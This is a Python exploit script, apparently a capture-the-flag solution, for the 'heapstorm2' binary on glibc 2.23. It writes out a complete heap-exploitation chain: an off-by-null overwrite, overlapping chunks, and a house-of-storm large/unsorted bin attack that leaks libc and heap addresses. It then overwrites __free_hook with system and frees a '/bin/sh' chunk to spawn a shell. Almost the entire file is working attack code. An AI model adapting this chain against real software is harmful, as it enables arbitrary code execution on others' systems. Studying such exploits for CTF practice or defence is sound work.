# File: exp.py
# Author: raycp
# Date: 2019-05-29
# Description: exp for heapstorm2

from pwn_debug import *

pdbg=pwn_debug("./heapstorm2")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("")
pdbg.debug("2.23")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_basei

def add(size,):
    p.recvuntil("mand: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))


def update(idx,size,data):
    p.recvuntil("mand: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(data)

def delete(idx,):
    p.recvuntil("mand: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("mand: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def pwn():
   
    add(0x28)   #0

    add(0xa90)  #1
    add(0x80)   #2
    add(0x20)   #3

    delete(1) #1
    ## step 1 off-by-null overwrite the size of 1st chunk
    update(0,0x28-0xc,'a'*(0x28-0xc))
    

    add(0x100)  #1
    add(0x20)  #4
    add(0x400)  #5
    add(0x20)  #6
    add(0x410)  #7
    add(0xb0-0x60)   #8
    
    #pdbg.bp(0x113c)
    ## step 2 chunk merge to form overlap chunk
    delete(1)
    delete(2)
  
    add(0xb20) #1 this big chunk contains chunk 4,5,6,7,8
    #delete(4)
    payload='a'*0x100+p64(0)+p64(0x31)+'\x00'*0x20+p64(0x0)+p64(0x411)+'\x00'*0x400+p64(0)+p64(0x31)+'\x00'*0x20+p64(0)+p64(0x421)+'\x00'*0x410+p64(0)+p64(0x191)+'\x00'
    update(1,len(payload),payload)

    ## step 3 free the first large bin with size 0x410 into large bin
    delete(5)
    add(0x500) #2 ## free the large bin into largebins
    
    ## step 4 free the second large bin with size 0x420 into unsoretd bin
    delete(7)

    ## step 5 build the fake data to perform house of storm attack
    payload='a'*0x100+p64(0)+p64(0x31)+'\x00'*0x20
    mmap_addr=0x13370000
    target_out=mmap_addr+0x800-0x10
    fake_bk_nextsize=target_out-5-0x20+8
    fake_bk=target_out+8
    fake_large=p64(0)+p64(0x411)+p64(0)+p64(fake_bk)+p64(0)+p64(fake_bk_nextsize)
    fake_large=fake_large.ljust(0x410,'\x00')
    payload+=fake_large
    payload+=p64(0x410)+p64(0x30)+'\x00'*0x20
    
    fake_chunk=target_out
    fake_unsorted=p64(0)+p64(0x421)+p64(0)+p64(fake_chunk)
    fake_unsorted=fake_unsorted.ljust(0x420,'\x00')
    payload+=fake_unsorted+p64(0x420)+p64(0x190)+'\x00'
    ## here overwrite the bk_nextsize and bk of largebin and overwrite the bk of unsorted bin
    update(1,len(payload),payload)

    #pdbg.bp([0xe7d,0x1054,0xee8,0x12ca])
    ## step 6 evil addr (0x133707f0) is malloc out
    add(0x48) #5

    ##  step 7 build fake 0 with mmap_addr+0x820 to leak random key and heap address
    payload=p64(0)+p64(0)+p64(0x13377331)+p64(0)+p64(mmap_addr+0x820)+p64(0x90)
    update(5,len(payload),payload)
    #pdbg.bp([0xe7d,0x1054,0xee8,0x12ca])
    view(0)
    p.recvuntil("]: ")
    p.recv(0x50)
    libc_base=(u64(p.recv(8))^0x13370800)-libc.symbols['main_arena']-0x58
    heap_base=(u64(p.recv(8))^0x48)-0x5b0
    log.info("libc base: %s"%(hex(libc_base)))
    log.info("heap_base: %s"%(hex(heap_base)))
    free_hook=libc_base+libc.symbols["__free_hook"]
    system_addr=libc_base+libc.symbols["system"]

    ## step 8 edit ptr point to __free_hook 
    payload=p64(mmap_addr+0x820)+p64(0x90)+p64(free_hook)+p64(0x20)+p64(mmap_addr+0x820+0x30)+p64(0x40)+"/bin/sh\x00"
    update(0,len(payload),payload)
    
    ## step 9 write system addr to __free_hook
    payload=p64(system_addr)
    update(1,len(payload),payload)
    #pdbg.bp(0x113c)
    ## step 10 trigger free to get shell
    delete(2)

    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

